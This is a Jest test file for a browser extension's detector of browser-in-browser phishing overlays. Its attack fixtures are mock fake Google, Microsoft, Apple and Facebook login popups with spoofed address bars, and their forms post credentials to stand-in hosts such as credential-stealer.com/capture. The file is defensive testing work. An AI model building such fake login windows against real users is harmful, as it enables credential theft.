/**
 * BitB (Browser-in-Browser) Detection Unit Tests
 *
 * Tests the BitB detection logic against:
 * 1. Legitimate scenarios (should NOT trigger alerts)
 * 2. BitB attack scenarios (SHOULD trigger alerts)
 *
 * Date: 2026-01-09
 */

const fs = require('fs');
const path = require('path');

// Load config
const configContent = fs.readFileSync(path.join(__dirname, '..', 'config.js'), 'utf8');
eval(configContent.replace('window.CONFIG', 'global.CONFIG'));
const CONFIG = global.CONFIG;

// Mock Chrome APIs
global.chrome = {
    storage: {
        local: { get: jest.fn(() => Promise.resolve({})), set: jest.fn(() => Promise.resolve()) },
        sync: { get: jest.fn(() => Promise.resolve({ backgroundSecurity: true })) }
    },
    runtime: { id: 'test', sendMessage: jest.fn(() => Promise.resolve({})) },
    i18n: { getMessage: jest.fn(key => key) }
};

// Mock window.location
const mockLocation = (hostname) => {
    delete global.window;
    global.window = {
        location: { hostname, href: `https://${hostname}/` },
        getComputedStyle: jest.fn(() => ({
            position: 'fixed',
            zIndex: '10000',
            display: 'block',
            visibility: 'visible',
            borderRadius: '0'
        }))
    };
};

// ============================================================================
// BitB DETECTION FUNCTIONS (extracted from content.js)
// ============================================================================

/**
 * Find fake URL bar in element
 */
function findFakeUrlBarInElement(container, config, currentHost) {
    const allElements = container.querySelectorAll('span, div, p, a, input[readonly]');

    for (const el of allElements) {
        if (el.children && el.children.length > 3) continue;

        const text = (el.textContent || '').trim();

        if (text.length >= 15 && text.length <= 100) {
            for (const pattern of config.fakeUrlBarPatterns || []) {
                if (pattern.test(text)) {
                    const textHost = text.replace(/^https?:\/\//, '').split('/')[0].toLowerCase();
                    if (textHost !== currentHost && !currentHost.endsWith('.' + textHost)) {
                        return el;
                    }
                }
            }
        }
    }
    return null;
}

/**
 * Find window controls
 */
function findWindowControls(container, config) {
    const details = [];
    const indicators = config.windowControlIndicators || {};

    const textContent = container.innerText || '';
    const innerHTML = container.innerHTML || '';

    if (indicators.trafficLights?.test(textContent)) {
        details.push('trafficLights');
    }

    if (indicators.closeButtons?.test(textContent)) {
        details.push('closeButton');
    }

    if (indicators.controlClasses?.test(innerHTML)) {
        details.push('controlClasses');
    }

    return { found: details.length > 0, details };
}

/**
 * Check if form posts to same domain
 */
function isSameDomainLogin(form, currentHost) {
    const formAction = form?.getAttribute('action');
    if (formAction) {
        try {
            const actionHost = new URL(formAction, `https://${currentHost}`).hostname;
            return actionHost === currentHost;
        } catch (e) {
            return false;
        }
    }
    return false;
}

/**
 * Main BitB analysis function
 */
function analyzeOverlayForBitB(overlay, config, currentHost) {
    const indicators = [];
    let score = 0;
    const scores = config.scores;
    const foundTypes = new Set();

    const overlayText = (overlay.innerText || '').toLowerCase();

    // 1. Check voor fake URL bar
    const fakeUrlBar = findFakeUrlBarInElement(overlay, config, currentHost);
    if (fakeUrlBar) {
        indicators.push({ type: 'fakeUrlBar', url: fakeUrlBar.textContent?.substring(0, 60) });
        score += scores.fakeUrlBar;
        foundTypes.add('fakeUrlBar');
    }

    // 2. Check voor window controls
    const windowControls = findWindowControls(overlay, config);
    if (windowControls.found) {
        indicators.push({ type: 'windowControls', details: windowControls.details });
        score += scores.windowControls;
        foundTypes.add('windowControls');
    }

    // 3. Check voor login form
    const loginInputs = overlay.querySelectorAll(
        'input[type="password"], input[type="email"], ' +
        'input[name*="password"], input[name*="email"], input[name*="user"]'
    );

    if (loginInputs.length > 0) {
        const form = overlay.querySelector('form');
        const sameDomain = isSameDomainLogin(form, currentHost);

        if (!sameDomain) {
            indicators.push({ type: 'loginForm', inputs: loginInputs.length });
            score += scores.loginFormInOverlay;
            foundTypes.add('loginForm');

            // OAuth branding check
            for (const brand of config.oauthBranding || []) {
                if (overlayText.includes(brand.toLowerCase())) {
                    indicators.push({ type: 'oauthBranding', brand });
                    score += scores.oauthBrandingWithForm;
                    foundTypes.add('oauthBranding');
                    break;
                }
            }
        }
    }

    // 4. Check voor padlock icon (simplified)
    if (overlay.innerHTML.includes('🔒') || overlay.innerHTML.includes('padlock') ||
        overlay.innerHTML.includes('fa-lock') || overlay.innerHTML.includes('icon-lock')) {
        indicators.push({ type: 'padlockIcon' });
        score += scores.padlockIcon;
        foundTypes.add('padlockIcon');
    }

    // 5. Check voor window chrome style (simplified)
    if (overlay.innerHTML.includes('title-bar') || overlay.innerHTML.includes('window-header') ||
        overlay.innerHTML.includes('browser-frame') || overlay.innerHTML.includes('chrome-frame')) {
        indicators.push({ type: 'windowChromeStyle' });
        score += scores.windowChromeStyle;
        foundTypes.add('windowChromeStyle');
    }

    return { score, indicators, foundTypes };
}

/**
 * Determine if BitB attack based on indicator combinations
 */
function evaluateBitBAttack(foundTypes) {
    const hasFakeUrlBar = foundTypes.has('fakeUrlBar');
    const hasLoginForm = foundTypes.has('loginForm');
    const hasWindowControls = foundTypes.has('windowControls');
    const hasOAuthBranding = foundTypes.has('oauthBranding');
    const hasWindowChrome = foundTypes.has('windowChromeStyle');
    const hasPadlock = foundTypes.has('padlockIcon');

    if (hasFakeUrlBar) {
        return { isLikelyBitB: true, severity: 'critical', reason: 'fakeUrlBar' };
    }
    if (hasLoginForm && hasWindowControls) {
        return { isLikelyBitB: true, severity: 'critical', reason: 'loginForm+windowControls' };
    }
    if (hasLoginForm && hasOAuthBranding) {
        return { isLikelyBitB: true, severity: 'critical', reason: 'loginForm+oauthBranding' };
    }
    if (hasLoginForm && hasWindowChrome && hasPadlock) {
        return { isLikelyBitB: true, severity: 'warning', reason: 'loginForm+windowChrome+padlock' };
    }
    if (hasWindowControls && hasWindowChrome && hasPadlock) {
        return { isLikelyBitB: true, severity: 'warning', reason: 'windowControls+windowChrome+padlock' };
    }

    return { isLikelyBitB: false, severity: null, reason: null };
}

// ============================================================================
// MOCK DOM HELPER
// ============================================================================

function createMockElement(html, innerText = '') {
    return {
        innerHTML: html,
        innerText: innerText || html.replace(/<[^>]*>/g, ''),
        textContent: innerText || html.replace(/<[^>]*>/g, ''),
        children: { length: 0 },
        querySelectorAll: jest.fn((selector) => {
            const results = [];

            // Simple mock for input elements
            if (selector.includes('input[type="password"]') && html.includes('type="password"')) {
                results.push({ type: 'password' });
            }
            if (selector.includes('input[type="email"]') && html.includes('type="email"')) {
                results.push({ type: 'email' });
            }

            // Mock for spans/divs with URL text
            if (selector.includes('span') || selector.includes('div')) {
                const urlMatch = html.match(/>(https?:\/\/[^<]+)</);
                if (urlMatch) {
                    results.push({
                        textContent: urlMatch[1],
                        children: { length: 0 }
                    });
                }
            }

            return results;
        }),
        querySelector: jest.fn((selector) => {
            if (selector === 'form') {
                const actionMatch = html.match(/action="([^"]+)"/);
                if (actionMatch) {
                    return { getAttribute: () => actionMatch[1] };
                }
            }
            return null;
        }),
        getAttribute: jest.fn(() => null),
        offsetWidth: 400,
        offsetHeight: 300
    };
}

// ============================================================================
// TEST SUITES
// ============================================================================

describe('BitB Detection - Legitimate Scenarios (Should NOT Alert)', () => {

    test('Cookie consent banner - no alert', () => {
        mockLocation('www.woofandbarker.nl');

        const overlay = createMockElement(
            `<div class="wsa-cookielaw">
                Wij slaan cookies op om onze website te verbeteren. Is dat akkoord?
                <a href="/cookielaw/optIn/" class="wsa-cookielaw-button">Ja</a>
                <a href="/cookielaw/optOut/" class="wsa-cookielaw-button">Nee</a>
            </div>`,
            'Wij slaan cookies op om onze website te verbeteren. Is dat akkoord? Ja Nee'
        );

        const result = analyzeOverlayForBitB(overlay, CONFIG.BITB_DETECTION, 'www.woofandbarker.nl');
        const evaluation = evaluateBitBAttack(result.foundTypes);

        expect(evaluation.isLikelyBitB).toBe(false);
        expect(result.foundTypes.size).toBe(0);
    });

    test('Same-domain login sidebar - no alert', () => {
        mockLocation('www.example-shop.nl');

        const overlay = createMockElement(
            `<form action="https://www.example-shop.nl/account/login" method="post" id="login">
                <h5>Inloggen</h5>
                <input type="email" name="email" placeholder="E-mailadres">
                <input type="password" name="password" placeholder="Wachtwoord">
                <button type="submit">Inloggen</button>
            </form>`,
            'Inloggen E-mailadres Wachtwoord Inloggen'
        );

        // Override querySelector to return form with same-domain action
        overlay.querySelector = jest.fn((selector) => {
            if (selector === 'form') {
                return { getAttribute: () => 'https://www.example-shop.nl/account/login' };
            }
            return null;
        });

        const result = analyzeOverlayForBitB(overlay, CONFIG.BITB_DETECTION, 'www.example-shop.nl');
        const evaluation = evaluateBitBAttack(result.foundTypes);

        expect(evaluation.isLikelyBitB).toBe(false);
        expect(result.foundTypes.has('loginForm')).toBe(false);
    });

    test('Newsletter popup - no alert', () => {
        mockLocation('www.newsletter-site.com');

        const overlay = createMockElement(
            `<div class="modal newsletter-modal">
                <h2>Subscribe to our newsletter</h2>
                <form action="https://www.newsletter-site.com/subscribe">
                    <input type="email" name="email" placeholder="Your email">
                    <button>Subscribe</button>
                </form>
            </div>`,
            'Subscribe to our newsletter Your email Subscribe'
        );

        overlay.querySelector = jest.fn((selector) => {
            if (selector === 'form') {
                return { getAttribute: () => 'https://www.newsletter-site.com/subscribe' };
            }
            return null;
        });

        const result = analyzeOverlayForBitB(overlay, CONFIG.BITB_DETECTION, 'www.newsletter-site.com');
        const evaluation = evaluateBitBAttack(result.foundTypes);

        expect(evaluation.isLikelyBitB).toBe(false);
    });

    test('Age verification popup - no alert', () => {
        mockLocation('www.age-restricted.com');

        const overlay = createMockElement(
            `<div class="age-gate modal">
                <h2>Are you 18 or older?</h2>
                <button class="btn-yes">Yes</button>
                <button class="btn-no">No</button>
            </div>`,
            'Are you 18 or older? Yes No'
        );

        const result = analyzeOverlayForBitB(overlay, CONFIG.BITB_DETECTION, 'www.age-restricted.com');
        const evaluation = evaluateBitBAttack(result.foundTypes);

        expect(evaluation.isLikelyBitB).toBe(false);
    });

    test('Shopping cart sidebar - no alert', () => {
        mockLocation('www.shop.com');

        const overlay = createMockElement(
            `<aside id="cart" class="sidebar">
                <h5>Winkelwagen</h5>
                <p>U heeft geen artikelen in uw winkelwagen</p>
                <a href="/cart/">Bestellen</a>
            </aside>`,
            'Winkelwagen U heeft geen artikelen in uw winkelwagen Bestellen'
        );

        const result = analyzeOverlayForBitB(overlay, CONFIG.BITB_DETECTION, 'www.shop.com');
        const evaluation = evaluateBitBAttack(result.foundTypes);

        expect(evaluation.isLikelyBitB).toBe(false);
    });

    test('GDPR privacy popup - no alert', () => {
        mockLocation('www.eu-site.com');

        const overlay = createMockElement(
            `<div class="gdpr-modal overlay">
                <h3>Privacy Settings</h3>
                <p>We use cookies to improve your experience</p>
                <button class="accept">Accept All</button>
                <button class="reject">Reject All</button>
                <button class="customize">Customize</button>
            </div>`,
            'Privacy Settings We use cookies to improve your experience Accept All Reject All Customize'
        );

        const result = analyzeOverlayForBitB(overlay, CONFIG.BITB_DETECTION, 'www.eu-site.com');
        const evaluation = evaluateBitBAttack(result.foundTypes);

        expect(evaluation.isLikelyBitB).toBe(false);
    });
});

describe('BitB Detection - Attack Scenarios (SHOULD Alert)', () => {

    test('Fake Google login with URL bar - CRITICAL', () => {
        mockLocation('evil-phishing.com');

        const overlay = createMockElement(
            `<div class="modal browser-window">
                <div class="title-bar">
                    <span class="url-bar">https://accounts.google.com/signin</span>
                    <span class="close-btn">×</span>
                </div>
                <form action="https://evil-phishing.com/steal">
                    <h2>Sign in with Google</h2>
                    <input type="email" name="email">
                    <input type="password" name="password">
                    <button>Sign In</button>
                </form>
            </div>`,
            'https://accounts.google.com/signin × Sign in with Google Sign In'
        );

        // Mock querySelectorAll to return URL bar element
        overlay.querySelectorAll = jest.fn((selector) => {
            if (selector.includes('span') || selector.includes('div')) {
                return [{
                    textContent: 'https://accounts.google.com/signin',
                    children: { length: 0 }
                }];
            }
            if (selector.includes('input[type="password"]')) {
                return [{ type: 'password' }];
            }
            if (selector.includes('input[type="email"]')) {
                return [{ type: 'email' }];
            }
            return [];
        });

        const result = analyzeOverlayForBitB(overlay, CONFIG.BITB_DETECTION, 'evil-phishing.com');
        const evaluation = evaluateBitBAttack(result.foundTypes);

        expect(evaluation.isLikelyBitB).toBe(true);
        expect(evaluation.severity).toBe('critical');
        expect(result.foundTypes.has('fakeUrlBar')).toBe(true);
    });

    test('Fake Microsoft login with URL bar - CRITICAL', () => {
        mockLocation('phishing-site.xyz');

        const overlay = createMockElement(
            `<div class="popup window-frame">
                <div class="browser-header">
                    <span class="address">https://login.microsoftonline.com/common/oauth2</span>
                    <button class="btn-close">×</button>
                </div>
                <form action="https://phishing-site.xyz/capture">
                    <img src="microsoft-logo.png">
                    <h2>Sign in with Microsoft</h2>
                    <input type="email" name="user">
                    <input type="password" name="pass">
                </form>
            </div>`,
            'https://login.microsoftonline.com/common/oauth2 × Sign in with Microsoft'
        );

        overlay.querySelectorAll = jest.fn((selector) => {
            if (selector.includes('span') || selector.includes('div')) {
                return [{
                    textContent: 'https://login.microsoftonline.com/common/oauth2',
                    children: { length: 0 }
                }];
            }
            if (selector.includes('input[type="password"]')) {
                return [{ type: 'password' }];
            }
            if (selector.includes('input[type="email"]')) {
                return [{ type: 'email' }];
            }
            return [];
        });

        const result = analyzeOverlayForBitB(overlay, CONFIG.BITB_DETECTION, 'phishing-site.xyz');
        const evaluation = evaluateBitBAttack(result.foundTypes);

        expect(evaluation.isLikelyBitB).toBe(true);
        expect(evaluation.severity).toBe('critical');
    });

    test('Login form with window controls (no URL bar) - CRITICAL', () => {
        mockLocation('attacker.com');

        const overlay = createMockElement(
            `<div class="fake-window modal">
                <div class="window-control title-bar">
                    <span>● ○ ○</span>
                    <span>Login</span>
                    <span class="close">×</span>
                </div>
                <form action="https://external-steal.com/capture">
                    <input type="email" name="email">
                    <input type="password" name="password">
                    <button>Login</button>
                </form>
            </div>`,
            '● ○ ○ Login × Login'
        );

        overlay.querySelectorAll = jest.fn((selector) => {
            if (selector.includes('input[type="password"]')) {
                return [{ type: 'password' }];
            }
            if (selector.includes('input[type="email"]')) {
                return [{ type: 'email' }];
            }
            return [];
        });

        overlay.querySelector = jest.fn((selector) => {
            if (selector === 'form') {
                // Form posts to DIFFERENT domain - suspicious!
                return { getAttribute: () => 'https://external-steal.com/capture' };
            }
            return null;
        });

        const result = analyzeOverlayForBitB(overlay, CONFIG.BITB_DETECTION, 'attacker.com');
        const evaluation = evaluateBitBAttack(result.foundTypes);

        expect(evaluation.isLikelyBitB).toBe(true);
        expect(evaluation.severity).toBe('critical');
        expect(result.foundTypes.has('windowControls')).toBe(true);
        expect(result.foundTypes.has('loginForm')).toBe(true);
    });

    test('Login form with OAuth branding - CRITICAL', () => {
        mockLocation('fake-login.com');

        const overlay = createMockElement(
            `<div class="oauth-modal popup">
                <form action="https://credential-stealer.com/capture">
                    <h2>Sign in with Google</h2>
                    <p>Continue with Google to access your account</p>
                    <input type="email" name="email" placeholder="Email">
                    <input type="password" name="password" placeholder="Password">
                    <button class="google-btn">Continue with Google</button>
                </form>
            </div>`,
            'Sign in with Google Continue with Google to access your account Email Password Continue with Google'
        );

        overlay.querySelectorAll = jest.fn((selector) => {
            if (selector.includes('input[type="password"]')) {
                return [{ type: 'password' }];
            }
            if (selector.includes('input[type="email"]')) {
                return [{ type: 'email' }];
            }
            return [];
        });

        overlay.querySelector = jest.fn((selector) => {
            if (selector === 'form') {
                // Form posts to DIFFERENT domain - credential theft!
                return { getAttribute: () => 'https://credential-stealer.com/capture' };
            }
            return null;
        });

        const result = analyzeOverlayForBitB(overlay, CONFIG.BITB_DETECTION, 'fake-login.com');
        const evaluation = evaluateBitBAttack(result.foundTypes);

        expect(evaluation.isLikelyBitB).toBe(true);
        expect(evaluation.severity).toBe('critical');
        expect(result.foundTypes.has('loginForm')).toBe(true);
        expect(result.foundTypes.has('oauthBranding')).toBe(true);
    });

    test('Fake Apple login popup - CRITICAL', () => {
        mockLocation('apple-phish.net');

        const overlay = createMockElement(
            `<div class="apple-signin-modal">
                <div class="window-header title-bar">
                    <span class="location-bar">https://appleid.apple.com/auth</span>
                </div>
                <form action="https://apple-phish.net/steal">
                    <img src="apple-logo.svg">
                    <h3>Sign in with Apple</h3>
                    <input type="email" name="appleid">
                    <input type="password" name="password">
                </form>
            </div>`,
            'https://appleid.apple.com/auth Sign in with Apple'
        );

        overlay.querySelectorAll = jest.fn((selector) => {
            if (selector.includes('span') || selector.includes('div')) {
                return [{
                    textContent: 'https://appleid.apple.com/auth',
                    children: { length: 0 }
                }];
            }
            if (selector.includes('input[type="password"]')) {
                return [{ type: 'password' }];
            }
            if (selector.includes('input[type="email"]')) {
                return [{ type: 'email' }];
            }
            return [];
        });

        const result = analyzeOverlayForBitB(overlay, CONFIG.BITB_DETECTION, 'apple-phish.net');
        const evaluation = evaluateBitBAttack(result.foundTypes);

        expect(evaluation.isLikelyBitB).toBe(true);
        expect(evaluation.severity).toBe('critical');
    });

    test('Login with window chrome and padlock - WARNING or CRITICAL', () => {
        mockLocation('suspicious-site.com');

        const overlay = createMockElement(
            `<div class="login-popup browser-frame">
                <div class="window-header">
                    <span class="icon-lock">🔒</span>
                    <span>Secure Login</span>
                </div>
                <form action="https://external-auth.com/steal">
                    <input type="email" name="email">
                    <input type="password" name="password">
                </form>
            </div>`,
            '🔒 Secure Login'
        );

        overlay.querySelectorAll = jest.fn((selector) => {
            if (selector.includes('input[type="password"]')) {
                return [{ type: 'password' }];
            }
            if (selector.includes('input[type="email"]')) {
                return [{ type: 'email' }];
            }
            return [];
        });

        overlay.querySelector = jest.fn((selector) => {
            if (selector === 'form') {
                // Form posts to DIFFERENT domain
                return { getAttribute: () => 'https://external-auth.com/steal' };
            }
            return null;
        });

        const result = analyzeOverlayForBitB(overlay, CONFIG.BITB_DETECTION, 'suspicious-site.com');
        const evaluation = evaluateBitBAttack(result.foundTypes);

        expect(evaluation.isLikelyBitB).toBe(true);
        // Can be warning or critical depending on detected indicators
        expect(['warning', 'critical']).toContain(evaluation.severity);
        expect(result.foundTypes.has('loginForm')).toBe(true);
        expect(result.foundTypes.has('windowChromeStyle')).toBe(true);
        expect(result.foundTypes.has('padlockIcon')).toBe(true);
    });

    test('macOS-style traffic lights with window chrome - WARNING', () => {
        mockLocation('macos-fake.com');

        const overlay = createMockElement(
            `<div class="macos-window browser-frame">
                <div class="title-bar window-header">
                    <span class="traffic-light">🔴🟡🟢</span>
                    <span class="padlock">🔒</span>
                    <span>Secure Window</span>
                </div>
                <div class="content">
                    <p>Loading...</p>
                </div>
            </div>`,
            '🔴🟡🟢 🔒 Secure Window Loading...'
        );

        const result = analyzeOverlayForBitB(overlay, CONFIG.BITB_DETECTION, 'macos-fake.com');
        const evaluation = evaluateBitBAttack(result.foundTypes);

        expect(evaluation.isLikelyBitB).toBe(true);
        expect(evaluation.severity).toBe('warning');
        expect(result.foundTypes.has('windowControls')).toBe(true);
        expect(result.foundTypes.has('windowChromeStyle')).toBe(true);
        expect(result.foundTypes.has('padlockIcon')).toBe(true);
    });
});

describe('BitB Detection - Edge Cases', () => {

    test('Login form without any other indicators - no alert', () => {
        mockLocation('normal-site.com');

        const overlay = createMockElement(
            `<div class="simple-login">
                <form action="https://other-site.com/login">
                    <input type="email" name="email">
                    <input type="password" name="password">
                    <button>Login</button>
                </form>
            </div>`,
            'Login'
        );

        overlay.querySelectorAll = jest.fn((selector) => {
            if (selector.includes('input[type="password"]')) {
                return [{ type: 'password' }];
            }
            if (selector.includes('input[type="email"]')) {
                return [{ type: 'email' }];
            }
            return [];
        });

        overlay.querySelector = jest.fn((selector) => {
            if (selector === 'form') {
                return { getAttribute: () => 'https://other-site.com/login' };
            }
            return null;
        });

        const result = analyzeOverlayForBitB(overlay, CONFIG.BITB_DETECTION, 'normal-site.com');
        const evaluation = evaluateBitBAttack(result.foundTypes);

        // Login form alone is NOT enough for alert (needs combination)
        expect(evaluation.isLikelyBitB).toBe(false);
        expect(result.foundTypes.has('loginForm')).toBe(true);
        expect(result.foundTypes.size).toBe(1);
    });

    test('Window controls alone (no login) - no alert', () => {
        mockLocation('some-site.com');

        const overlay = createMockElement(
            `<div class="custom-modal">
                <div class="header">
                    <span>×</span>
                </div>
                <p>Some content here</p>
            </div>`,
            '× Some content here'
        );

        const result = analyzeOverlayForBitB(overlay, CONFIG.BITB_DETECTION, 'some-site.com');
        const evaluation = evaluateBitBAttack(result.foundTypes);

        expect(evaluation.isLikelyBitB).toBe(false);
    });

    test('Padlock icon alone - no alert', () => {
        mockLocation('secure-site.com');

        const overlay = createMockElement(
            `<div class="ssl-badge">
                <span>🔒 Secure Connection</span>
            </div>`,
            '🔒 Secure Connection'
        );

        const result = analyzeOverlayForBitB(overlay, CONFIG.BITB_DETECTION, 'secure-site.com');
        const evaluation = evaluateBitBAttack(result.foundTypes);

        expect(evaluation.isLikelyBitB).toBe(false);
        expect(result.foundTypes.has('padlockIcon')).toBe(true);
        // May also detect other indicators but should NOT alert without combination
    });

    test('Real OAuth redirect (legitimate) - no alert', () => {
        // When actually on accounts.google.com, this should NOT alert
        mockLocation('accounts.google.com');

        const overlay = createMockElement(
            `<div class="signin-box">
                <form action="https://accounts.google.com/signin/challenge">
                    <h1>Sign in</h1>
                    <input type="email" name="identifier">
                    <input type="password" name="password">
                </form>
            </div>`,
            'Sign in'
        );

        overlay.querySelectorAll = jest.fn((selector) => {
            if (selector.includes('span') || selector.includes('div')) {
                return [{
                    textContent: 'https://accounts.google.com/signin',
                    children: { length: 0 }
                }];
            }
            if (selector.includes('input[type="password"]')) {
                return [{ type: 'password' }];
            }
            return [];
        });

        overlay.querySelector = jest.fn((selector) => {
            if (selector === 'form') {
                return { getAttribute: () => 'https://accounts.google.com/signin/challenge' };
            }
            return null;
        });

        const result = analyzeOverlayForBitB(overlay, CONFIG.BITB_DETECTION, 'accounts.google.com');
        const evaluation = evaluateBitBAttack(result.foundTypes);

        // On the real Google domain, fake URL bar detection should NOT trigger
        expect(result.foundTypes.has('fakeUrlBar')).toBe(false);
        // Login form is same-domain, so also not flagged
        expect(result.foundTypes.has('loginForm')).toBe(false);
    });

    test('Facebook login with SSO text - CRITICAL', () => {
        mockLocation('phishing-fb.com');

        const overlay = createMockElement(
            `<div class="fb-login-modal">
                <form action="https://steal-credentials.net/capture">
                    <h2>Log in with Facebook</h2>
                    <input type="email" name="email">
                    <input type="password" name="pass">
                    <button>Continue with Facebook</button>
                </form>
            </div>`,
            'Log in with Facebook Continue with Facebook'
        );

        overlay.querySelectorAll = jest.fn((selector) => {
            if (selector.includes('input[type="password"]')) {
                return [{ type: 'password' }];
            }
            if (selector.includes('input[type="email"]')) {
                return [{ type: 'email' }];
            }
            return [];
        });

        overlay.querySelector = jest.fn((selector) => {
            if (selector === 'form') {
                // Form posts to DIFFERENT domain
                return { getAttribute: () => 'https://steal-credentials.net/capture' };
            }
            return null;
        });

        const result = analyzeOverlayForBitB(overlay, CONFIG.BITB_DETECTION, 'phishing-fb.com');
        const evaluation = evaluateBitBAttack(result.foundTypes);

        expect(evaluation.isLikelyBitB).toBe(true);
        expect(evaluation.severity).toBe('critical');
        expect(result.foundTypes.has('oauthBranding')).toBe(true);
    });
});

describe('BitB Detection - Statistics Summary', () => {

    test('Summary of all test scenarios', () => {
        const scenarios = {
            legitimateNoAlert: [
                'Cookie consent banner',
                'Same-domain login sidebar',
                'Newsletter popup',
                'Age verification popup',
                'Shopping cart sidebar',
                'GDPR privacy popup',
                'Login form alone (no other indicators)',
                'Window controls alone',
                'Padlock icon alone',
                'Real OAuth on real domain'
            ],
            attackShouldAlert: [
                'Fake Google login with URL bar',
                'Fake Microsoft login with URL bar',
                'Login form with window controls',
                'Login form with OAuth branding',
                'Fake Apple login popup',
                'Login with window chrome and padlock',
                'macOS-style traffic lights with window chrome',
                'Facebook login with SSO text'
            ]
        };

        console.log('\n=== BitB Detection Test Summary ===');
        console.log(`Legitimate scenarios (no alert expected): ${scenarios.legitimateNoAlert.length}`);
        scenarios.legitimateNoAlert.forEach(s => console.log(`  ✓ ${s}`));
        console.log(`\nAttack scenarios (alert expected): ${scenarios.attackShouldAlert.length}`);
        scenarios.attackShouldAlert.forEach(s => console.log(`  ⚠ ${s}`));
        console.log(`\nTotal scenarios tested: ${scenarios.legitimateNoAlert.length + scenarios.attackShouldAlert.length}`);

        expect(scenarios.legitimateNoAlert.length).toBeGreaterThan(0);
        expect(scenarios.attackShouldAlert.length).toBeGreaterThan(0);
    });
});
